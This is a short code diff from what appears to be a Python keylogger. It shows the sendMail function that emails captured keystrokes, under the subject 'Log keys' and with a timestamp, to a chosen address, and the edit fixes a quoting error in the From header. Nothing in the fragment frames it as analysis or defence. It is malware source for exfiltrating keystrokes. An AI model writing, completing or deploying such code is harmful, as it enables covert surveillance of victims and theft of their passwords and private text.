@@ -19,7 +19,7 @@ def sendMail(theEmail, thePasswd):
         exit()
     message = Message()
     message[ 'Subject' ] = 'Log keys' #邮件标题
-    message[ 'From' ] = "
+    message[ 'From' ] = ""
     message[ 'To' ] = theEmail
     message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
     msg = message.as_string()
